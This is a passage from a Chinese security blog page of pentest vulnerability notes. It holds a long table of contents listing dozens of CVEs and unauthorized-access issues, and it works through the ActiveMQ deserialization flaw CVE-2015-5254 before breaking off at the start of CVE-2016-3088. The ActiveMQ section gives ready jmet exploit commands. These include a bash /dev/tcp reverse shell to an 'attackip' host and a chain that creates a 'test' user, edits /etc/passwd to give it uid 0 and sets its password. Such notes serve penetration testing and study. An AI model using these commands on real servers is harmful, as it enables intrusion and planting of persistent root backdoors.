           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="正则表达式">正则表达式</span>
            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"
           data-tag="windows,提权"
           data-author="" >
            <span class="post-title" title="提权之Windows">提权之Windows</span>
            <span class="post-date" title="2020-05-21 21:46:22">2020/05/21</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E4%B9%8Bsafedog/"
           data-tag="WAF"
           data-author="" >
            <span class="post-title" title="绕WAF之safedog">绕WAF之safedog</span>
            <span class="post-date" title="2019-12-27 20:28:35">2019/12/27</span>
        </a>
        
        <a  class=""
           href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
           data-tag="信息搜集"
           data-author="" >
            <span class="post-title" title="渗透测试之信息搜集">渗透测试之信息搜集</span>
            <span class="post-date" title="2020-08-25 00:36:08">2020/08/25</span>
        </a>
        
        <a  class=""
           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"
           data-tag="工具,内网渗透,端口"
           data-author="" >
            <span class="post-title" title="端口转发与隧道技术">端口转发与隧道技术</span>
            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"
           data-tag="WAF"
           data-author="" >
            <span class="post-title" title="绕WAF之分块传输">绕WAF之分块传输</span>
            <span class="post-date" title="2019-12-27 09:24:52">2019/12/27</span>
        </a>
        
        <a  class=""
           href="/%E8%84%B1%E5%A3%B3/"
           data-tag="MISC,逆向"
           data-author="" >
            <span class="post-title" title="脱壳一">脱壳一</span>
            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
        </a>
        
        <a  class=""
           href="/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞,editor"
           data-author="" >
            <span class="post-title" title="编辑器漏洞">编辑器漏洞</span>
            <span class="post-date" title="2020-08-19 12:15:10">2020/08/19</span>
        </a>
        
        <a  class=""
           href="/Web-CheckList/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="Web-CheckList">Web-CheckList</span>
            <span class="post-date" title="2020-10-28 15:18:44">2020/10/28</span>
        </a>
        
        <a  class=""
           href="/%E8%84%B1%E5%A3%B3%E4%BA%8C/"
           data-tag="MISC,逆向"
           data-author="" >
            <span class="post-title" title="脱壳二">脱壳二</span>
            <span class="post-date" title="2020-01-01 15:51:38">2020/01/01</span>
        </a>
        
        <a  class=""
           href="/%E6%97%A5%E5%BF%97/"
           data-tag="log"
           data-author="" >
            <span class="post-title" title="日志">日志</span>
            <span class="post-date" title="2020-07-25 22:12:45">2020/07/25</span>
        </a>
        
        <a  class=""
           href="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"
           data-tag="漏洞,端口"
           data-author="" >
            <span class="post-title" title="漏洞记录">漏洞记录</span>
            <span class="post-date" title="2020-06-06 21:36:18">2020/06/06</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-漏洞记录" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">漏洞记录</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            
            <a class="color3">漏洞</a>
            
            <a class="color3">端口</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title=''>2020-06-06 21:36<br/>
        更新时间: 2020-12-02 00:19:02
        </time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞记录-——安全测试备忘录"><span class="toc-text">漏洞记录 ——安全测试备忘录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）"><span class="toc-text">ActiveMQ 反序列化漏洞（CVE-2015-5254）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ActiveMQ-任意文件写入漏洞（CVE-2016-3088）"><span class="toc-text">ActiveMQ 任意文件写入漏洞（CVE-2016-3088）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修复"><span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><span class="toc-text">Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache解析漏洞"><span class="toc-text">Apache解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Axis-1-4远程代码执行（CVE-2019-0227）"><span class="toc-text">Apache Axis 1.4远程代码执行（CVE-2019-0227）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Shiro-1-2-4-反序列化漏洞（CVE-2016-4437）"><span class="toc-text">Apache Shiro 1.2.4 反序列化漏洞（CVE-2016-4437）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro测试二"><span class="toc-text">shiro测试二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#APACHE-TOMCAT-文件包含漏洞（CVE-2020-1938）"><span class="toc-text">APACHE TOMCAT 文件包含漏洞（CVE-2020-1938）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Confluence"><span class="toc-text">Confluence</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CouchDB-CVE-2017-12635垂直权限绕过-CVE-2017-12636任意命令执行"><span class="toc-text">CouchDB CVE-2017-12635垂直权限绕过 CVE-2017-12636任意命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-12635垂直权限绕过"><span class="toc-text">CVE-2017-12635垂直权限绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-12636任意命令执行"><span class="toc-text">CVE-2017-12636任意命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Coremail配置文件信息泄漏"><span class="toc-text">Coremail配置文件信息泄漏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Couchcms-2-0-存在路径泄露漏洞（CVE-2018-7662）"><span class="toc-text">Couchcms 2.0 存在路径泄露漏洞（CVE-2018-7662）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Django-JSONField-sql注入漏洞（CVE-2019-14234）"><span class="toc-text">Django JSONField sql注入漏洞（CVE-2019-14234）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Django-sql注入漏洞（CVE-2020-7471）"><span class="toc-text">Django sql注入漏洞（CVE-2020-7471）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Django-Geo-sql注入（CVE-2020-9402）"><span class="toc-text">Django Geo sql注入（CVE-2020-9402）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker-未授权访问"><span class="toc-text">docker 未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Drupal-lt-7-32-“Drupalgeddon”-sql注入（CVE-2014-3704）"><span class="toc-text">Drupal &lt; 7.32 “Drupalgeddon” sql注入（CVE-2014-3704）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）"><span class="toc-text">Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）"><span class="toc-text">Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Drupal-远程代码执行漏洞（CVE-2018-7602）"><span class="toc-text">Drupal 远程代码执行漏洞（CVE-2018-7602）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Drupal-远程代码执行漏洞（CVE-2019-6339）"><span class="toc-text">Drupal 远程代码执行漏洞（CVE-2019-6339）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Drupal-远程代码执行漏洞（CVE-2019-6340）"><span class="toc-text">Drupal 远程代码执行漏洞（CVE-2019-6340）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ElasticSearch-未授权访问"><span class="toc-text">ElasticSearch 未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Elasticsearch-1-5-x-后台getshell"><span class="toc-text">Elasticsearch 1.5.x 后台getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）"><span class="toc-text">ElasticSearch 命令执行漏洞（CVE-2014-3120）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）"><span class="toc-text">ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#F5-BIG-IP-远程代码执行漏洞poc-exp（CVE-2020-5902）"><span class="toc-text">F5 BIG-IP 远程代码执行漏洞poc exp（CVE-2020-5902）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FCKeditor"><span class="toc-text">FCKeditor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FTP"><span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gitbook-任意文件读取（CVE-2017-15688）"><span class="toc-text">Gitbook 任意文件读取（CVE-2017-15688）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gitlab-任意文件读取漏洞（CVE-2016-9086）"><span class="toc-text">Gitlab 任意文件读取漏洞（CVE-2016-9086）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GoAhead-远程代码溢出漏洞（CVE-2019-5096）"><span class="toc-text">GoAhead 远程代码溢出漏洞（CVE-2019-5096）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hadoop-YARN-ResourceManager-未授权访问"><span class="toc-text">Hadoop YARN ResourceManager 未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jboss-JMX-Console未授权访问Getshell"><span class="toc-text">Jboss JMX Console未授权访问Getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JBoss-JMX-Console-HtmlAdaptor-Getshell（CVE-2007-1036）"><span class="toc-text">JBoss JMX Console HtmlAdaptor Getshell（CVE-2007-1036）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JBoss-Administration-Console-弱口令-Getshell"><span class="toc-text">JBoss Administration Console 弱口令 Getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><span class="toc-text">JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JBosS-AS-6-X-反序列化漏洞（CVE-2017-12149）"><span class="toc-text">JBosS AS 6.X 反序列化漏洞（CVE-2017-12149）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jenkins-功能未授权访问导致的远程命令执行漏洞"><span class="toc-text">Jenkins 功能未授权访问导致的远程命令执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）"><span class="toc-text">Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jenkins-远程命令执行漏洞（CVE-2018-1000861）"><span class="toc-text">Jenkins 远程命令执行漏洞（CVE-2018-1000861）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jenkins-远程代码执行漏洞（CVE-2019-1003000）"><span class="toc-text">Jenkins 远程代码执行漏洞（CVE-2019-1003000）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-jinja2-SSTI-服务端模版注入攻击"><span class="toc-text">Flask/jinja2 SSTI 服务端模版注入攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kindeditor-lt-4-1-11-上传漏洞（CVE-2017-1002024）"><span class="toc-text">Kindeditor &lt;=4.1.11 上传漏洞（CVE-2017-1002024）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP-未授权访问"><span class="toc-text">LDAP 未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Memcached-未授权访问"><span class="toc-text">Memcached 未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修复建议"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MongoDB-未授权访问"><span class="toc-text">MongoDB 未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞危害"><span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境准备与未授权无密码连接"><span class="toc-text">环境准备与未授权无密码连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#工具连接或漏洞验证"><span class="toc-text">工具连接或漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mongodb相关命令"><span class="toc-text">mongodb相关命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复或加固"><span class="toc-text">漏洞修复或加固</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关参考"><span class="toc-text">相关参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NDMP"><span class="toc-text">NDMP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS-未授权访问"><span class="toc-text">NFS 未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述-1"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞危害-1"><span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务检测"><span class="toc-text">服务检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证"><span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复或加固-1"><span class="toc-text">漏洞修复或加固</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#office-宏攻击"><span class="toc-text">office 宏攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RabbitMQ"><span class="toc-text">RabbitMQ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-未授权访问"><span class="toc-text">Redis 未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#终端运行客户端"><span class="toc-text">终端运行客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#图形化windows-redis客户端"><span class="toc-text">图形化windows redis客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis服务器原网站"><span class="toc-text">redis服务器原网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#未授权测试——写入文件到网站"><span class="toc-text">未授权测试——写入文件到网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写入文件到windows开机启动目录"><span class="toc-text">写入文件到windows开机启动目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#未授权测试——反弹shell"><span class="toc-text">未授权测试——反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap扫描redis"><span class="toc-text">nmap扫描redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis写入公钥免密登录"><span class="toc-text">redis写入公钥免密登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#主从redis"><span class="toc-text">主从redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用命令"><span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安全加固"><span class="toc-text">安全加固</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关参考-1"><span class="toc-text">相关参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rsync-未授权访问"><span class="toc-text">rsync 未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Samba-远程代码执行漏洞（CVE-2015-0240）"><span class="toc-text">Samba 远程代码执行漏洞（CVE-2015-0240）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Samba-远程命令执行漏洞（CVE-2017-7494）"><span class="toc-text">Samba 远程命令执行漏洞（CVE-2017-7494）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH"><span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-libssh认证绕过CVE-2018-10933"><span class="toc-text">SSH libssh认证绕过CVE-2018-10933</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-用户名枚举漏洞（CVE-2018-15473）"><span class="toc-text">SSH 用户名枚举漏洞（CVE-2018-15473）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#X11-server-未授权访问（默认6000端口）"><span class="toc-text">X11 server 未授权访问（默认6000端口）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZooKeeper-未授权访问"><span class="toc-text">ZooKeeper 未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞描述-2"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞危害-2"><span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-1"><span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复或加固-2"><span class="toc-text">漏洞修复或加固</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#禅道"><span class="toc-text">禅道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#深信服EDR漏洞"><span class="toc-text">深信服EDR漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#深信服-SANGFOR-EDR（终端检测响应平台）-任意用户登录"><span class="toc-text">深信服-SANGFOR EDR（终端检测响应平台）-任意用户登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#天融信TopApp-LB-负载均衡系统sql注入"><span class="toc-text">天融信TopApp-LB 负载均衡系统sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#天融信数据防泄漏系统越权修改管理员密码"><span class="toc-text">天融信数据防泄漏系统越权修改管理员密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#天融信负载均衡TopApp-LB系统无需密码直接登陆"><span class="toc-text">天融信负载均衡TopApp-LB系统无需密码直接登陆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#天融信TopApp-LB负载均衡命令执行漏洞大量设备可被通杀"><span class="toc-text">天融信TopApp-LB负载均衡命令执行漏洞大量设备可被通杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用友GRP-u8-注入"><span class="toc-text">用友GRP-u8 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绿盟UTS综合威胁探针管理员任意登录"><span class="toc-text">绿盟UTS综合威胁探针管理员任意登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Laravel-5-8-注入漏洞"><span class="toc-text">Laravel 5.8 注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#齐治堡垒机前台远程命令执行（CNVD-2019-20835）"><span class="toc-text">齐治堡垒机前台远程命令执行（CNVD-2019-20835）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="漏洞记录-——安全测试备忘录"><a href="#漏洞记录-——安全测试备忘录" class="headerlink" title="漏洞记录 ——安全测试备忘录"></a>漏洞记录 ——安全测试备忘录</h2><p><a href="#CVE-2015-5254">ActiveMQ 反序列化漏洞（CVE-2015-5254）</a><br><a href="#CVE-2016-3088">ActiveMQ 任意文件写入漏洞（CVE-2016-3088）</a><br><a href="#CVE-2010-2861">Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</a><br><a href="#Apache解析漏洞">Apache解析漏洞</a><br><a href="#CVE-2019-0227">Apache Axis 1.4远程代码执行（CVE-2019-0227）</a><br><a href="#CVE-2016-4437">Apache Shiro 1.2.4 反序列化漏洞（CVE-2016-4437）</a><br><a href="#CVE-2020-1938">APACHE TOMCAT 文件包含漏洞（CVE-2020-1938）</a><br><a href="#Confluence">Confluence</a><br><a href="#CVE-2017-12636">CouchDB CVE-2017-12635垂直权限绕过 CVE-2017-12636任意命令执行</a><br><a href="#Coremail">Coremail配置文件信息泄漏</a><br><a href="#CVE-2018-7662">Couchcms 2.0 存在路径泄露漏洞（CVE-2018-7662）</a><br><a href="#CVE-2019-14234">Django JSONField sql注入漏洞（CVE-2019-14234）</a><br><a href="#CVE-2020-7471">Django sql注入漏洞（CVE-2020-7471）</a><br><a href="#CVE-2020-9402">Django Geo sql注入（CVE-2020-9402）</a><br><a href="#docker">docker 未授权访问</a><br><a href="#CVE-2014-3704">Drupal &lt; 7.32 “Drupalgeddon” sql注入（CVE-2014-3704）</a><br><a href="#CVE-2017-6920">Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）</a><br><a href="#CVE-2018-7600">Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）</a><br><a href="#CVE-2018-7602">Drupal 远程代码执行漏洞（CVE-2018-7602）</a><br><a href="#CVE-2019-6339">Drupal 远程代码执行漏洞（CVE-2019-6339）</a><br><a href="#CVE-2019-6340">Drupal 远程代码执行漏洞（CVE-2019-6340）</a><br><a href="#ElasticSearch">ElasticSearch 未授权访问</a><br><a href="#Elasticsearch后台getshell">Elasticsearch 1.5.x 后台getshell</a><br><a href="#CVE-2014-3120">ElasticSearch 命令执行漏洞（CVE-2014-3120）</a><br><a href="#CVE-2015-1427">ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</a><br><a href="#F5_BIG-IP">F5 BIG-IP 远程代码执行漏洞poc exp（CVE-2020-5902）</a><br><a href="#FCKeditor">FCKeditor</a><br><a href="#CVE-2017-15688">Gitbook 任意文件读取（CVE-2017-15688）</a><br><a href="#CVE-2016-9086">Gitlab 任意文件读取漏洞（CVE-2016-9086）</a><br><a href="#CVE-2019-5096">GoAhead 远程代码溢出漏洞（CVE-2019-5096）</a><br><a href="#Hadoop">Hadoop YARN ResourceManager 未授权访问</a><br><a href="#JBoss未授权访问">Jboss JMX Console未授权访问Getshell</a><br><a href="#CVE-2007-1036">JBoss JMX Console HtmlAdaptor Getshell（CVE-2007-1036）</a><br><a href="#JBoss">JBoss Administration Console 弱口令 Getshell</a><br><a href="#CVE-2017-7504">JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</a><br><a href="#CVE-2017-12149">JBosS AS 6.X 反序列化漏洞（CVE-2017-12149）</a><br><a href="#Jenkins">Jenkins 功能未授权访问导致的远程命令执行漏洞</a><br><a href="#CVE-2017-1000353">Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）</a><br><a href="#CVE-2019-1003000">Jenkins 远程代码执行漏洞（CVE-2019-1003000）</a><br><a href="#SSTI">Flask/jinja2 SSTI 服务端模版注入攻击</a><br><a href="#CVE-2017-1002024">Kindeditor &lt;=4.1.11 上传漏洞（CVE-2017-1002024）</a><br><a href="#LDAP">LDAP 未授权访问</a><br><a href="#Memcache">Memcache 未授权访问</a><br><a href="#MongoDB">MongoDB 未授权访问</a><br><a href="#NFS">NFS 未授权访问</a><br><a href="#office宏攻击">office 宏攻击</a><br><a href="#Redis">Redis 未授权访问</a><br><a href="#rsync">rsync 未授权访问</a><br><a href="#CVE-2015-0240">Samba 远程代码执行漏洞（CVE-2015-0240）</a><br><a href="#CVE-2017-7494">Samba 远程命令执行漏洞（CVE-2017-7494）</a><br>[SSH]<br><a href="#CVE-2018-10933">SSH libssh认证绕过CVE-2018-10933</a><br><a href="#CVE-2018-15473">SSH用户枚举（CVE-2018-15473）</a><br><a href="#X11">X11 server 未授权访问（默认6000端口）</a><br><a href="#ZooKeeper未授权访问">ZooKeeper 未授权访问</a><br>禅道</p>
<hr>
<h2 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a><span id="CVE-2015-5254">ActiveMQ 反序列化漏洞（CVE-2015-5254）</span></h2><ol>
<li>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</li>
<li>端口：</li>
<li><ul>
<li>61616：工作端口</li>
</ul>
</li>
<li><ul>
<li>8161：web控制台端口（漏洞所在处）</li>
</ul>
</li>
<li>[jmet-0.1.0-all.jar]<a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a>，在同目录下创建一个external文件夹</li>
<li>执行命令：<code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME serverip 61616</code></li>
<li>此时会给目标的ActiveMQ添加一个名为事件的队列，可以我们通过<a href="http://IP:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息" target="_blank" rel="noopener">http://IP:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息</a></li>
<li>点击查看这条消息即可触发命令执行</li>
<li>反弹shell：<code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -i &gt;&amp; /dev/tcp/attackip/1234 0&gt;&amp;1&quot; -Yp ROME serverip 61616</code></li>
<li>其他：</li>
<li>执行jmet的命令添加test用户并将其添加到root组,返回<a href="http://IP:8161/admin/browse.jsp?JMSDestination=event页面，点击一下消息，触发它" target="_blank" rel="noopener">http://IP:8161/admin/browse.jsp?JMSDestination=event页面，点击一下消息，触发它</a></li>
<li><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;useradd -g root -s /bin/bash -u 10010 test&quot; -Yp ROME  serverip  61616</code></li>
<li>再将passwd中的test的uid修改为0，使它拥有root权限,返回<a href="http://IP:8161/admin/browse.jsp?JMSDestination=event页面，点击一下消息，触发它。" target="_blank" rel="noopener">http://IP:8161/admin/browse.jsp?JMSDestination=event页面，点击一下消息，触发它。</a></li>
<li><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;sed -i &quot;s/test:x:10010/test:x:0/g&quot; /etc/passwd&quot; -Yp ROME   serverip  61616</code></li>
<li>再为test用户设置一个密码,返回<a href="http://IP:8161/admin/browse.jsp?JMSDestination=event页面，点击一下消息，触发它。" target="_blank" rel="noopener">http://IP:8161/admin/browse.jsp?JMSDestination=event页面，点击一下消息，触发它。</a></li>
<li><code>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;echo &quot;test:123456&quot; | chpasswd&quot; -Yp ROME   serverip   61616</code></li>
</ol>
<hr>
<h2 id="ActiveMQ-任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ-任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ 任意文件写入漏洞（CVE-2016-3088）"></a><span id="CVE-2016-3088">ActiveMQ 任意文件写入漏洞（CVE-2016-3088）</span></h2><ol>
<li>ActiveMQ控制台，分三个应用：admin、api和fileserver，admin是管理员页面，api是接口，fileserver是存储文件的接口。admin和api需要登录才能使用。</li>
<li>版本：Apache ActiveMQ 5.x ~ 5.14.0</li>
<li>端口：</li>
<li><ul>
<li>61616：工作端口</li>
</ul>
</li>
<li><ul>
<li>8161：web控制台端口（漏洞所在处）</li>
</ul>
</li>
<li><strong>漏洞利用</strong></li>
<li>问题出现在fileserver，fileserver支持写入文件（PUT方法）且支持移动文件（MOVE请求），但不解析，所以这里上传文件再移动文件位置，即可造成任意文件写入漏洞。</li>
